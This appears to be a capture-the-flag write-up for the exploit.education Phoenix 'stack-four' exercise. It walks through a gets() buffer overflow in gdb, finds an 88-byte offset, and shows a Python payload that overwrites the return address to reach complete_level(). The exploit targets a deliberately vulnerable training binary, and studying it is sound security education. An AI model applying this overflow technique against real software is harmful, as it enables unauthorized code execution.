# Code Analysis:

## Code Execution:

```bash
./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
test
and will be returning to 0x40068d

python3 -c 'print("A" * 70)' | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d

python3 -c 'print("A" * 80)' | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d
Segmentation fault
```
We know the program likely returns to the function at address `0x40068d`.

## Source Code:

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```
There are 3 functions,
main:
1. Displays the banner.
2. Executes the `start_level()` function.

start_level:
1. Initializes a 64-byte `buffer` variable with the user's input.
2. Initializes a `ret` variable that contains the return address of the current function.
3. Displays the `ret` variable.

complete_level:
1. Displays the completion message for the level.

# Exploitation:

## How?

To reach the `complete_level()` function, we must:
- Find the offset between `buffer` and the return address of `start_level()`.
- Replace the return address of `start_level()` with that of `complete_level()`.

## Demonstration:

### Finding the Offset

First, we note the return address of `start_level()`:

```bash
./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
test

and will be returning to 0x40068d
```

Which is `0x40068d`.

Next, we look for the start of the stack:

- We create a pattern:
```bash
sudo python3 -c 'import sys; sys.stdout.buffer.write(b"A" + b"B" * 62 + b"C")' > input
cat input 
ABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBC
```
- We then go into gdb and set a breakpoint on the `start_level()` function:
```bash
b start_level 
Breakpoint 1 at 0x400639
```
- We run the program using the pattern and continue until `gets()`:
```bash
run < input
n
n
n
n
```
- We examine the stack to see where the start of the pattern is:
```bash
x/24x $sp

0x7fffffffe4d0:	0x42424241	0x42424242	0x42424242	0x42424242
0x7fffffffe4e0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe4f0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe500:	0x42424242	0x42424242	0x42424242	0x43424242
0x7fffffffe510:	0xffffe500	0x00007fff	0xffffe540	0x00007fff
0x7fffffffe520:	0xffffe540	0x00007fff	0x0040068d	0x00000000
```

The start of the stack is therefore `0x7fffffffe4d0`.

Now, let's find where `0x40068d` is on the stack:
```bash
find 0x7fffffffe4d0, +96, 0x0040068d

0x7fffffffe528
1 pattern found.
```

The address where `start_level()` returns is `0x7fffffffe528`.

We can now calculate the offset:
```bash
printf "%i

\n", 0x7fffffffe528 - 0x7fffffffe4d0

88
```
### Replacing `start_level()` with `complete_level()`

The address of `complete_level()` is `0x40061d`.

```bash
info functions 
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400460  printf@plt
0x0000000000400470  gets@plt
0x0000000000400480  puts@plt
0x0000000000400490  exit@plt
0x00000000004004a0  __libc_start_main@plt
0x00000000004004b0  _start
0x00000000004004c6  _start_c
0x00000000004004f0  deregister_tm_clones
0x0000000000400520  register_tm_clones
0x0000000000400560  __do_global_dtors_aux
0x00000000004005f0  frame_dummy
0x000000000040061d  complete_level
0x0000000000400635  start_level
0x000000000040066a  main
0x00000000004006a0  __do_global_ctors_aux
0x00000000004006e2  _fini
```
### Payload:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 88 + b"\x1d\x06\x40\x00\x00\x00\x00\x00")' | ./stack-four

Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```
